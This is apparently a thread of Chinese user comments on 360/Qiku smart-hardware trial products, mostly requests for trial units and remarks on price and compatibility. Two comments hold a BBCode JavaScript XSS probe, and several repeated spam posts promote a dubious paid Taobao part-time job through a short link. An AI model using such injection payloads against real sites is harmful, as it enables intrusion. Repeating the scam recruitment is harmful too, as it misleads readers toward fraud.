感觉很不错，有点小贵啊，如果有试用就好了，偷笑下
设计很不错，这样好看，还不石板，占地方
亲们，我们公司就有这款产品噢，淘宝搜索Hisy, 还有其他系列，UFO SHOT，正在促销125包邮^^
图片过多，缺乏对产品使用过程中的心得以及对产品的感知！
这就是虚拟现实机
太到位了！！我们会努力改善产品，争取早日呈现最完美的智键~
这个是个好东西，估计会大卖，平均每人也得用个四五个吧，
bucuo怎么购买
虚拟现实技术终于迈出实质性的一步，照这发展，3D游戏都弱爆了，也蹦的不了花了。但是，从游戏开发，测试到推向市场，还有一段未知的时间。但无论如何，成本的降低，使得虚拟终端的价格能被大多数人接受。随着虚拟现实技术的不断成熟，虚拟现实，正慢慢走来
切网吧都用不了！！！别说了.岁什么岁带....
补充说明疑点： 1、目前几家通讯巨头在宣传4G网络时，都声称要手机设置是4G的，卡也要是4G的，要机卡匹配才能享用4G网络。 2、360公司即将出品4G随身WIFI，如果360粉丝的手机设备和卡都是3G或者2G能享用吗？
设计厚度是有考虑的你以为都跟你手机一样没有套？
容量再大一点，换成USB 3.0的，最好双接口，另一头配上OTG接手机更方便。
感觉还不错。未来家庭肯定会广泛使用
不止对于覆盖范围怎么样，不过我认为未来家电也要趋向于智能化控制。应该会减少试用红外。
就目前看来只支持移动的4g，未来不知道联通是否会大范围布局fdd lte~不过价格相对来说划算多了~就是不知道试用时间怎么样
性价比不算高，这么高的价格竟然没有传感器，自动调节亮度。
太大了，之前早就有人出过比这个小的多的nfc贴片。
不知道识别率、误差率怎么样。概念非常的好，期待实物能上线~~~
这个很好，不过希望u盘可以加密，防水什么的。
360如果发布的话应该直接可以买的把，不会像小米那么流氓要靠抢，虽然我是小米用户，我也能抢得到，但也很讨厌这样的购物体验。
加上U盘很不错，使用起来会更方便
好想有一台
减掉一个零我就考虑。
将来灯泡是不是都是智能的了
约合人民币1470元，太贵了
哈哈，同感
出差神奇啊，太需要了
又向现实与虚拟模糊化迈出了一步……
真不错！！！
只是流量怎么充啊？！
关注价格和续航
有点贵，价格不适合工薪阶层
[img]javascript:alert(document.domain)[/img]
[img]javascript:alert(document.domain)[/img]
喜欢节能产品，期待发布！
很有兴趣，我是电子产品发烧友
便宜成本较低..样式可突破性强 
智能家居一体化正在步步逼近呀..
产品看起来很酷，但是感觉用起来这么复杂呢
基本看懂了用法，哈哈
我也没通过，希望这次成功
为什么我的申请都没有通过啊  哎 希望这次可以
对啊 对啊  
玩这个得有很强的艺术细胞啊。
防水性能如何？充电做成无线不就没有接口了，至少防水要好些
按钮和复位孔应该也可以嵌入到表盘内，加上背光标识应该会好些 麦克风降噪便于在嘈杂环境，加以分辩
一举两得，又便宜，不用纠结有无线网了，可以当U盘，到同学家再插一下就行了
确实，我也发现了，但我一般看中的是使用后的总结部分！至于体会，每个人都不同，我觉得这样的心得，换个人也许就是其他的，所以~~
有了这玩意儿绝对省力的多，不要老是去扫地，每天只用直接拖地就好了，什么头发灰尘类的基本都没了
这个写的好详实呀..图表厉害
怎么分打这么低？感觉挺好用的啊。
2、360公司即将出品4G随身WIFI，如果360粉丝的手机设备和卡都是3G或者2G能享用吗？  答：能用。 4G随身wifi需要一张4G的移动SIM卡
不知道空调的学习成本高不高？除了电视和空调还有什么地方能用到呢？
这么好。我要去福建 
那成本怎么也得500了。
是这个样子的。应该叫360 4G无线路由器。
(^_-)好期待
之前用过HTC的G11 用了2年还是很不错的 很信赖HTC 关注中。。。
期待，上次都没成功试用
一千块人民币的戒指。比钻戒便宜点。
老公卫士非常实用点赞！
360公司的老周到处演讲声称要听用户的声音，尊重用户的体验，因此这次这个360随身4G-WIFI面世，我相信老周此次和中移动合作，一定会策划出一个低廉的套餐资费才敢推出，如果资费太高用户用不起，得不到体验，得不到实惠，那如果真要这样的话，这个产品是不会成功的。我是360铁杆粉丝-陈思迪，预祝360随身4G-WIFI成功取得用户信任，因此：红衣大炮，一炮而红！一炮雄起！
同求一个老公卫士~~
嘿嘿嘿嘿……最后一个，可以天天捡肥皂啦⊙▽⊙
老公卫士。。。。
超赞的，超喜欢~
那个不是智键吧？不是还木有发售么？
一起加油吧！写了好多字希望可以得到呢！已经失败两次了
期待得到，尽管基本无望
699我还不如买台手机。。。
还有如自动窗帘机等都可以用，只要是使用红外遥控的。
没有老婆卫士么？
早就应该出了嘛！
这产品好 晚上尿尿 从些方便好多了  
这么高大上的设备，做为资深数码单品发烧友，支持一个！
我要超长待机的，必须大容量电池哈。我第一部
如果能够添加系统重装，等其他功能就更好了 
这个必须支持，有需求啊
这个对各个人群都适用    这个好   可以专注老年人的身体状况  可以给减肥者一个系统的数据   想要个
手机支架，小黄蜂。
手机支架，小黄蜂。
着一下雨，不就完了吗。
你手机是啥？
老公卫士应该戴在老婆身上，提示老公“老婆就在附近，小心行事”
你收到的是奇酷网发送的吗？
不错，很详尽的说明书
精品报告，图标对比做的很不错
，，，，，，饿了多吃点
我想知道的是一般去移动办个新的SIM卡，之前的卡就不能用了。这要是把卡插在360随身wifi里，手机怎么用啊，还能接电话吗
无线座机应该更好。。
很是诱人。。。。 
这个确实是一个靠谱的想法。
老公卫士其实也可以做为防丢卫士
玩这个的必须有很强的艺术感，如果在这个笔里面内置一个芯片。在配置一个傻瓜式的软件去操作的话，这样估计普及面会很广的。谢谢
老婆卫士 可以有
是的，小白用户能玩的产品才是好产品
还有12个小时，期待试用
再用电的方面感觉有欠缺。。
记得国内好像也有一款类似的3D打印笔
这个很好，但是，如果能做到储存电能的就好了。。。这样晚上也可以用它来充电1
写得很精彩，果断给赞
好需求，哈哈
坐等这个产品，感觉很好
期待更多功能。。。
购买链接有问题。。。。
这种设备外形一般都很讨巧..
穿戴设备最后还是穿到了手机上
碉堡了！这个确实能解决电池一大问题！
不知道iphone和小米能不能用？
苹果能用不？
360多功能路由哈哈
希望U盘能做成启动盘，方便装系统，不用再用第三方软件，不过还是期待升级版，因为如360wifi一样，2代比1代好太多了
可以天天捡肥皂啦
都很喜欢啊，有木有，都很想要啊，行不行？
这个不错，可以有
需求很强烈，这样就不需要每天晚上都下床关灯了。
肥皂是亮点...
这个写得不错，慢慢学习中。
看图示note3吧  刚好我是呀
是不是什么机型都有的？
手机壳带充电器 不知道好用不
期待试用，看看待机如何
看名字是位专业极客呀  哈哈
暂时不能 app只发布了andriod版的  苹果的可能以后有吧！
太贵了手机，，感觉一般呀
应该可以通用吧
又有新产品了，看起来很高端
将手机奇酷配件进行到底啊。加油
喜欢，最近正需要这类东东。
三星的用户有福了。。。
好期待哦，坐等试用名单！
额 ~~~~~~~~~~~~~~
期待期待。
呵呵，好想为自己的Note3配一个哦
造型太硬朗，不适合女性。产品会不会太重，太重不适合携带，续航时间够不够长，不然也是废铁
现在考虑的是 手机壳的手感 安装是否方便 对手机有无损害 是否是三星系统完美兼容 好的话这个真可以推广啊
看外观 上边面有点厚啊 不知道美观如何
期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待期待
手电筒拍照功能方便好用，但是，造成了我的手机不定时死机重启。。期待更好
略屌。。。。。。
有创意，支持一下，科技让生活更美好！
什么手机都可以吗？
不知道是否对手机散热有影响
关注价格中
感觉材质造型都不错就是小贵 
有特点，也会有缺点。这么薄，电量应该只能应急。
看起来像是三星定制款的，期望能出更多适配机型的，最好是可嵌入式的，能直接嵌入到手机外壳或保护套中最好了。
图片已加，请关注闪拍图片质量问题
嗯 说是三星galaxy用户 感觉蛮酷的..
就是不知道戴上的实际效果怎么样。
终于等到这款划科技滴产品了。。。看到朋友用滴所谓套加电之类滴手机套。。。厚厚滴感觉十分不爽。。。如果能用上这款纸电池手机套滴话绝对可以在朋友们面前炫一把了。。。(*^__^*) 嘻嘻……
看来是三星用户的福音，什么时候佛光普照其他机型？
这款智能手表很漂亮，喜欢这种造型。
U盘能做成启动盘，方便装系统。最好还有检测硬盘的
要是1500还差不多
我們NOTE3的有福了，祈禱
不错 就是别太贵 买一个它等于一台健身器 那我宁可买健身器了。。大几百还可以考虑
智键君你好，照片模糊是我的手机摄像头防震配置不高，不是闪拍的问题，我的重点是提议闪拍后加一个预览功能，因为闪拍后要调回智键相机那里才可以看到照片效果，增加预览马上看到照片效果，效果不好马上重拍，突出一个“快”字，谢谢！
这个非常稀罕，可以多来些试用啊
这个很好，不过，这样的散热怎样呢
用不了额……
1500马上入手
不错，方便使用
9508白色申请一个
9508申请一个白色
9008申请樱桃粉。。
这个必须要支持一下！
设计不错！
一个词“帅气”，申请试用！
这个使用起来很方便，赞！
好期待哦，坐等试用名单！
好期待哦，坐等试用名单！
 产品挺好，愿奇酷多出一些这样的好东东
这个产品有意思
9009申请水晶白
高科技！！！
这个也不错
正在开发中唷! 敬请期待:)
挺智能的一款LED灯泡，可以不用下床去开关灯，还可以用手机调节色温范围
装上纸电池手机套後, 能分担原装电池负担, 比单独使用原装电池还不容易过热唷! 并且能延长原装电池寿命, 好处多多!
很喜欢这类产品，就是期待价格大众化一点，要不会是个负担！
9508白色，我也要一个。希望这个能管用，现在的智能手机电池太不经用了。一天至少得一充。有了这个是不是就可以两天一充了。但是这个纸电池如何充电呢？和手机一起充？还有原智能手机套是否就不能用了？
希望有个一个白色的NOTE3，送给我最亲爱的他！虽然每次这种狗屎运都很难降临在我的头上，不过还是真心希望有那么一次狗屎运呢！
U盘平时工作的时候拔下来到别的电脑上拷东西网不就断了？
这个皮套还要根据手机型号才可以哦，我的是酷派大神f1，不知道有没有啊？
坐等试用名单！
好东东，什么时候上市？
东西真不错，希望能够购买！
是不是什么手机都可以用呢，小米的可以不呢
感觉有点重，不过应该会有影院的感觉~3D哇
就是说要买个新的卡？好像也还好吧。。。三家电话卡都能支持吗？
感觉很高级，家里也有一台扫地机器人。不过比较笨就是了，比较不好的就是不知道它有没有全部走过一趟。。。
等着换路由 加快进度啊
我怎么感觉要定制手机才可以用啊？
是不是只有定制的手机才可以用啊？
今天可是评选的最后一天了，就要公布结果了。不知道有没有俺呢？期待喔。俺希望试下这个智能钱夹喔。因为俺就经常忘带东西啊啊啊。。。。。。。。。。
希望不要太贵
太贵了！买不起
钱包偷了能定位吗？
太贵了，可以买辆奥迪+终身汽油钱了 
卖的那么贵，有意义吗
看起来好厉害的样子。。请问您是啥职业的。。
纸电池手机套可以延长手机电池续航力8小时哟! 不必另外充电, 让你每天多8小时打电话玩游戏!
就是8g容量小了点
这个能预报地震？逆天啊！
关注性能 价格中
看不出来是什么东西。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】
求s3的适配啊
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】a
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】s
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】d
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】q
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】r
很赞很赞~~~每次都这么认真难怪总能中签~~
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】c
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】i
神啊，赐给我一个吧，不，亲自的活动主办方，赐个我一个吧，感谢
关注 希望价格.........
够新鲜！够强大！只是手机型号不支持，的确挺遗憾的。。
其实还可以美化的！！！
纸电池手机套装上之前只需要在後盖里放入一薄片, 一个动作, 只需三秒钟, 三岁小孩都会, 此薄片没黏性, 随时可拿出, 完全不损害手机, 并且完全不干涉三星系统, 只给你电力增加, 不给你任何负担!
还以为抽中我了呢！
不错，很详尽的说明书！功能很多喔！
有点贵鸟。 
试用官好认真。 在看APP设置那一块，头都大了，难道这个仅限IT人使用？
最好设计通用的，价格不贵的话，还真能赚爆了。
APP设置确实是比较复杂，我觉得官方还应该有很多的地方需要去优化。建立更多的模版和设置向导引导用户去设置。
技术很强大啊！正在使用三星S4，春天来了，给我家小星星求个樱桃粉的花裙子！
有些贵呀~若是1500，立马抢购！
顶，想法很奇特，我喜欢。
喜欢！数量太少了！
哇，好详细的体验报告！我最近一直加班，都还没拆箱，回家赶紧试试去。
看上去很不错 顶一个
智能手表快出吧
能试用吗，考了十年的驾照就等它了
中国啥时有卖的呀，内地
我的note3终于可以摆脱移动电源了，嘎嘎
非常有创意，真心想早点体验一下！顶！
我也是太忙没时间，今晚才抽空编辑了一下。
没有标明产品电池容量，不过这是个很实用的产品，设计很便于携带，还解决了三星手机的“马航”通病（经常失联）。Noto3本身体积够大了，加上好点也不低，有了它就不在傻傻的打电话时还举个移动电源了（就像连体婴）。
期待被抽中，哈哈，已经连续两期被抽中了
非常方便，有了它，就不用买移动电源了。
赞一下。小黄人主题啊。
一百以内可以接受、一百以上销售量一定不好
非常方便，有了它，就不用买移动电源了。
希望有中文的 
移动电源的终结者！！！！！！！！！！为了360工程师的设计赞一个！！！！！！！！
土耳其大豆芽
很期待尽快有成品下线出售...
支持360 硬件~
也不知道什么时候出其他手机的。。。。。
沙发自己做~
niubility! 
我擦！报告写的还能再牛点儿么？！板凳必须是我的！
必须要赞一个了。最精彩的个性报告。
真心赞一个！写的很棒，很用心，很有新意！已经发到论坛加精华了！
很不错啊。你家的红外东西可真多啊。
400美元好像有点点贵哦。
你真的赢了。NB的报告啊。
一直未中，一直在关注，一直在期待
额，看到了，好像只有note3和s4啊，啊哦！
奇酷，你们很棒！ 
有秘诀不？？
什么时候发售啊
能支持无线充电技术吗？看着蛮方便的
期待被抽中
阿拉灯神钉？
3D不错哇、、
好想体验一下
感觉不错，喜欢这款
没看到耳塞啊，在哪里？图
感觉挺有用的，就是价格太贵了，要699
要知道你这么好玩儿，我昨天就应该跟你再多聊会了~
在什么价格呢
不知道怎么样。什么时候能开卖
什么价位呢
不知到好用不
哈哈哈，***神器。
还没搞懂是什么东西
好详细的评测。智键君感谢你~
我就是s4
这位写得很认真，也很有深度，建议360关注下。
这个产品上一年就已经出来了吧。 相当的好用
纸电池手机套装上智能手机之後, 便能随着智能手机充电时一同充电, 不需要拆下另外充电唷! 
纸电池手机套装上智能手机之後, 便能随着智能手机充电时一同充电, 不需要拆下另外充电唷! 
这个产品外观感觉还得改下。
如果是LG 我只能说 价格参照三星。。。。
如果没有两个刷头 你怎么在地保界混 搭载手机操控可以提升应用乐趣也能减少实物成本 不过归根到底 多少钱 
期待中奖，好像试试感觉咋样
大家都在等待上市，我也想买一款给孩子，你们可以先开放预约啊。
NFC不多吧
联想A790e
太可爱了！
应该首先支持nexus系列，希望可以采纳
敢不敢再详细点？
大妹子，回个话呗。。。
我忘了说了，智键最好能切歌，切歌啊啊啊啊     切歌啊亲！
SoundLink III机身重量仅为1.37kg，机身尺寸为13.15×25.6×4.8mm 1.37kg才这么小的体积？？？
我忘了说了，智键最好能切歌，切歌啊啊啊啊 切歌啊亲！
我是NOTE3
路过刘明。 几个测试的都说APP存在bug.
谢谢支持！！！
什么东西都能发明，只有你想不到的。没有别人做不到的
这个产品都第三期测试了，怎么还这样我有点纳
期待大容量，多样式
关心价格哦
求试用体验
选我哦 求试用
ffasa
fafaf
xcxsd
我的是LG
OPPO N1随机附送的“小叮当”已经实现了
贵啊。。。。。。。。。。要是1500一定必须马上入手！！！！！！！！
看样子不是一般的强大啊
肯定好玩！！
是不是多了个0啊！
我能说我一直不用钱包就是怕钱包掉么？这东东可以当钱包用？还可以报警，好东西啊。
华为P1有木有！
我用小米手机！有木有！
我去，这是要科幻的节奏么？小说里面那些360度可视网游要实现了么？
造型挺喜欢的，不知音质怎么样？
首次预约？很不错啊
小贵，教主这个可以让试用下！
等待了那么长时间抢购，结果只是北京的用户有资格，真是坑人不浅，很受伤啊
必须给天线加个开关，减少辐射，绝对可以作为广告重点
有兴趣，银子太多不考徐
听说360准备入股三星，真的吗
少个零肯定下手啊
不错啊。。。。
感觉很智能，但是任何操作都要学习...不过真的很厉害耶，但是电视的没办法学习，还是我家电视台古老了= =
好想体验一下 
x小米可以用吗
太招贼，不敢买
非常想体验一下
喜欢，非常想体验一下
期待360路由！
好期待啊，期待360继续出更多的新东西啊！
要是小米3可以用就好了，还有就是这个纸电池是多少毫安的呢？
喜欢，不过价格比较高，还没打算入手，不过很酷
期待中……
哎，不知道，伤眼睛不，干脆弄虚拟头盔算吧！！！
已经有卖了，小米也快出仿制品了
不知道需要邮费吗？
哎，光技术可以兴奋下，价格不知道会是多少了
呵呵，创意
什么时候开售？
家里有一个，
少个0就可以买 了
估计是京东的问题吧。哈哈
膜拜，必须是理工男才能写得出来。
怎么买？我想要一个！
求试用.........求试用.............
求试用.......求试用
支持一下。
求试用.......
漂亮，喜欢
超喜欢这产品
有前景的好玩意
行不行哦？还有229美元是不是很暴力了？
在偷车贼液压钳横行的年代。锁不是用来开的，是切得！
IOS系统能用么？有针对这个智键的应用么？
米3可以用吗？
这什么破玩意 有个屁用 
喜欢，呵呵，但是另外一个就是关注价格，价格，价格
希望能够接受
都多长时间了，怎么还不普及。快点
http://www.xinyao.com.cn/blrxbdb/ 这里好像有卖了吧
http://126.am/xyzch 这里好像有出售了吧？
7999元应该有很多人买
强大的创新能力！
毫无意义的产品 这些功能你们手机上没有吗.我去 ,哈哈,还有那个360WIFI 家里有网,还用P手机.
七八十万买辆特斯拉，还不如买辆小跑车耍耍好
求体验，求试用
*限三星Galaxy S4和Note 3机型
已经买到 很喜欢
不知是造给谁开的
我是三星，我是三星。
Sony LT 29i
华为荣耀3c
我怎么感觉你有抄袭我的创意的嫌疑？
希望快一点出来
太棒了  幻想一下，用这个东东打类似于CS的射击游戏，那是什么感觉？
这个可以有  但这个大概只适合洁癖症及小资及伪小资及钱太多没处放的人用
O(∩_∩)O谢谢
加入红外功能就最好！~
家有2男孩，求使用。。。。
我是华为荣耀3c的手机啊……
搞个来用呀TCL N3
这是撸管神器啊。
试用，来一个。
手机后盖打不开的话怎么办，我的手机电池与机身是一体的
kao/三星note2的呢？ 
怎么预定啊？
鸡肋  鸡肋 
手机是低端机，如果能把智键上面加一个LED手电筒就好了。
智商捉急  如果没有360wifi  估计市面上的 各种路由器 还不会出小型的
是任何手机都可以用吗？
我就是星粉，我的S4等待着wearGo纸电池手机套的到来，中了一定好好写报告
太贵了，买不起，穷学生一个
傻鸟，请问你用的是什么鸟鸡疤手机？（,哈哈,还有那个360WIFI 家里有网,还用P手机. ）看见你这句话我真心笑了
真的很精彩，很想拥有啊
三星S4，我的能用，哈哈
跟oppo n1的小叮当差不多吧。
三星note3 n9002 求使用
自己申请个给女友S4用。不知道能不能成功，因为好多人都在申请，希望自己能成功，谢谢。
期待360路由器
就是啊    快快上试用  我最喜欢钓鱼了 
人血白蛋白价格，作用，说明书，贝林人血白蛋白 - 康德乐大药房
本人初三学生党，没有手机，只能眼馋了。唉~~~~~~~~~~
一直期待有这样功能的手机壳
求体验 很想试试   应该很拉风 
不看好U盘版，在二代开始就入手了，因为经常用而且时间长，有发烫现象，加上U盘功能的话也学没那么实用。
好期待啊，可以检测脂肪吗？
这个有前景，老人用的多。话说有辐射吗？
建议传一个好看的头像。中的几率就会大呢。
15000有点小贵。。
我就是星粉，我的S4等待着wearGo纸电池手机套的到来，中了一定好好写报告
能一键打开游戏么？
我一直期待有这样功能的手机壳 ，我的夏新a920w手机等待着wearGo纸电池手机套的到来，中了一定好好写报告。
艾马～～～～刚买了个类似产品，就要出这个，刚看到～～～后悔有点买早了
让爱充满人间
明天公布哟。
什以时候出啊？期待
要能试用就好了
戴眼镜的怎么办呢？
这个好！哪一家是原创啊！
我说的是即使有套,智键也有点厚了
我说的是即使有套,智键也有点厚了
360的产品一向我都支持！现在非常支持360智键。我要买到！
好期待，我的三星天天要充电，外电源又不方便携带，有了纸电池这一切都解决了，以美观又方便～
我的三星note3 n9006 非常有创意，真心想早点体验一下！顶！中了好好写报告。
感觉没什么用
什么时候出来啊？
都不知拿来有什么用~~
哪里有卖？
我现在使用的是三星Note3 N9009，因为工作的关系每天要充两次到三次电，移动电源又不方便携带，有了纸电池这一切都解决了，又美观又方便，如果奇酷官方给我这次试用的机会，我将认真对待并书写试用报告，谢谢！
再过11个小时就公开
6代可能是6000到6600百块钱左右了
小米2可以来围观么
拉风极了!!!
咳,,,价钱怎么样呢?
HTC求围观
求价格丫丫丫丫
表示灰常好
是充电还是利用骑行供电？
不明觉历……
太智能了～我太爱你了！太神奇了～
真的是看见一个就爱一个！手表简约大方，大爱～
流量肯定是运营商的 啊
哇！大半夜看了你们这么多商品，发现都很有创意，支持支持！👍👍👍
比较感兴趣的是：智键能不能实现关机或者是一键重启的指令？因为偶的电源按键有些不灵敏了……
大家想的都是手机充电,不知平板是否也適用?创意使用者是我!
我也想用一下下 
转~~~~~太强大了。360开发的新产品很牛！
你是来骗回复的么...
真有这么牛，想试用 
大魅族。。。。
这么神奇？还是独有的！估计过不了申请：）
蛮好的，二合一，就是容量小，Class几还不知道，最好容量大点，支持USB3.0就不out了。
15000确实有点让人难以接受哈！！这么方便，很容易丢的哈！！
估计丢得太快 
从小培养土豪高复摔的节奏！！！
很好！专业、公正、细致、用心。既然邀请大家测，就是请大家挑毛病的，以便把产品做的更好。那些高唱赞歌的测试报告就歇了吧。
哎哟，007哎，我终于找到你发的试用报告了，我得好好看看
不错啊， 呵呵     设备需要供电吗
很好，买个试试，只是现在手机不给力，得先换个好点的手机。同时给大家推荐个正在公测的手机软件，相当有“钱途”哦。而且现在还在搞活动，苹果5S等你免费拿，我也想要苹果55555555555555.有意向的猛戳http://url.cn/NoiPWq 
我的手机是三星S4能试用，如果真有这么好的东西，就省一天充电好几次了，也不用带充电堡旅行，真感谢你们良苦用心，发明创造，给广大手机用户带来不一样的惊喜
我的手机是note2，有能用的吗？
360的科技越来越厉害了，我一直都用着360的产品，看好360.
55555~~看了这么NB的报告，也想早日~~有智键
360硬件牛叉
手机皮套是不是就是一块电池
100+喜欢
祝你成功，相信你女友一定会喜欢！
祝你成功，相信你女友一定会喜欢！
祝你成功，相信你女友一定会喜欢！
哥们儿用的夏新手机，想拿来修改一下使用，不知可行否？
淘宝有售http://fp56.taobao.com
你之前不是看过吗？
做智能家居行业的．期待最新的智能产品．有三星Ｓ４和苹果４　５.供测试使用．希望有好机会．
我也想有。期待。
观音镇楼好牛逼
最后那张图太搞笑了~~奇酷瞬间好高大上的感觉。。。
奇粉...这个名字很不错啊。。。
上有政策，下有对策
手套感觉好厚啊。冬天带还行。
何时能出啊！！！！！ 
资深 智能手机 使用者  对电子产品感兴趣 
纽扣电池多不环保，而且一般商店超市也找不到纽扣电池，要是充电的，很环保，很方便。
我觉得是不是在暗扣设计方面存在隐患，久了会不会松了
很期待尽快有成品下线出售... 
好期待啊。就是30个有点少。不中我就看热闹。
由于不支持复制问题，评测断断续续上传的，现在完整啦。
求试用！！！！
爱生活，所以期待。
感谢楼主分享。
那还都出去夜骑做什么？那还要摩托做什么？那还要汽车做什么?不才山地车现在也有电动助力的了。。。
准备公布了吧？
期待中奖！！
又没中，又没中啊
连续4期申请都没中的同学也不要着急，在这里小小透露一下，会有专门的惊喜等着你们。大家看到没。
什么惊喜 好期待！
又没中！哎
淡淡的忧伤。哎！没中。。。。
要加上湿度 甲醛检测等功能才好 不然买个温度计放车内不就行了 10元不到解决问题
钱包木有中，三连中，就此终结
要坚持。哈哈。摇号不中也会继续摇嘛。
太棒了，小心脏砰砰跳，好激动，万分感谢小编~！
非常喜爱360的产品，有试用的冲动和***！
我写的不好么评测？为啥没我？
话说怎么成为会员呢？
哈哈！结果，从申请的那天就知道了，名单没我、、、看来，真的沦为酱油党了。。。
申请未中，无力吐槽啊！
无语了！太强大了！科技真是越来越发达了！这才是真正的高科技！
太强大，赶紧上市吧。
天语爱好者，U86，w619希望能有机会
近视的人怎么办？
我是魅族MX2用户，以前没有过试用，本着有好的坚持推荐，不好的支出问题的原则，希望能够试用
好想要5555555555555555................. 
这个有点期待！
三次了都没中了，心被伤得千创百孔的。。。。
有人连中四次了都。。。
我是note3 4G用户，iPhone4S，小米3，希望有机会试用
看好你的产品哦！！
又没中，伤心哦。期待下次了！
我一直在想，它怎么转弯
我愿意付邮费，寄给我可好
还有连中四次的呢？没看到啊。
用的就是三星s4，希望可以体验纸电池，这一种高科技
我用的是Note3，每天一充太烦人了，希望能试用这款可充电皮套。
因为期货等同于创意中
有啥方便的，你晚上尿尿还要先开手机，然后再用手机打开电灯？？？
好支持,我也希望可以试试看
我用的是红米note，和酷派大神，红米note还是能开盖的，希望奇酷给红米note带个套
支持一下 等待新品
我的是荣耀3c，期待一试！
造型似乎不太好看啊！是否可以参考Googleglass啊？
      我是魅族MX2用户，以前没有过试用，本着有好的坚持推荐，不好的支出问题的原则，希望能够试用  
求试用，弄不好就不用买车啦。很拉风啊，活广告啊
创意不错，就是不知道防蚊效果怎么样，还有就是对人体有没有伤害
这几个恶搞的图实在是太逗了。
加油啊，小米都盗版你的了，已经开始卖了，你要打败小米啊，加油，不要输给他
希望可以中一次！一定好好写  报告！
有这闲钱，还不如拉网线
我肯定不会要，玩手机还要带个手指套，没意思
我用的是三星S4，每天电话比较多，吊着个移动电源劳烦了，希望可以试试这个，十分的期待这个产品。希望能被选中成为幸运用户。若选中一定仔细认真写实践报告。
这个很喜欢，价格接受不了
看上去很不错啊。希望国内也能有类似的产品啊。
又不中，万箭穿心。。。啥也别说了！亮剑吧！保证不砍死你！
我也是忠实用户。希望连续不中能有惊喜。给个智键试试用一下也很不错啊。
我也是忠实用户。希望连续不中能有惊喜。给个智键试试用一下也很不错啊。
我也是忠实用户。希望连续不中能有惊喜。给个智键试试用一下也很不错啊。
我也是忠实用户。希望连续不中能有惊喜。给个智键试试用一下也很不错啊。
为什么有的人每次都中，我却一次次的在期望中走向绝望……
都希望只有我一个人申请啊！！╮(╯▽╰)╭
有没有试用？给我试试 好玩不先 
很不错的产品哦
一起期待一下。
一起期待一下。
一起期待一下。
一起期待一下。
一起期待一下。
不要绝望啊。我也四连败了。哈哈
到底能买了不？ 
麻痹的 几个意思 为什么只有北京有货 。。。难道天津不是中国 不能你麻痹发货么。。。
同没中啊。。。。
同没中啊。。。。
同没中啊。。。。
这手套感觉超棒，真想拥有一个。。。
同败同败，继续加油~
感觉在火车上可以给笔记本用。
恭喜恭喜！！
我也这么觉得~
面包会有的，智键也会有的~
希望该产品的型号能满足大家的需求，尺寸要按不同版本改进，特比要注意用电安全，最好防水，否则将存在安全隐患。。希望能过，
看着还不错 
很不错哦呵呵 
哇  哇 。。。。
满心的期待   出的话一定买一部  
额  相当于 移动电源 超薄化嘛  v.v  很有创意哦 
亲 请问你是在哪里反馈的呢
希望该产品的型号能满足大家的需求，尺寸要按不同版本改进，特比要注意用电安全，最好防水，否则将存在安全隐患。。希望能过， 
希望该产品的型号能满足大家的需求，尺寸要按不同版本改进，特比要注意用电安全，最好防水，否则将存在安全隐患。。希望能过， 
这手套很厚重吗，透不透气，手能自由伸缩吗。
超棒  光看看就热血沸腾啊   介绍给好友们  兹兹
功能不够强大  不过求试用     
我有中签了！哈哈，第二次了！
不要悲伤，加油
艹  我要中
额 耐摔吗？防水吗？抗热吗？
希望能中！！！
我有中签了！哈哈，第二次了！ 
我有中签了！哈哈，第二次了！ 
噗！！！！！！！！！！！
真方便啊？
去你妈的你个狗逼草的
路过看看！
头像好评啊喵~
恭喜大家中签哦。到时也可以分享到锋芒小栈上面哦
.....但  纸电池上面的电  要怎样充啊？？？求解~或者是一次性的??????
如果毫无意思，你何必关注和吐槽那？难道你就是传说中最闲的人？
创意好可惜支持的设备有局限
.........................?求一个！已经n次申请了！
这个如果能让试用就太牛叉了，看了简直就想立刻要，特别第二辆红色吉普款的比我的SUV感觉都帅气多了，市面上卖的就是塑料壳子加4个轮子，对电瓶不放心所以一直没敢给儿子买。。。。。  口水一地啊。。。。。
你们都有Note3，我也有的
你要什么图片啊？ 
续航能力咋样？华为也出4G的随身WI-FI了！支持扫描二维码加入网络！
我也非常期待  
这位同志哪里不太对劲，不要放弃治疗啊！
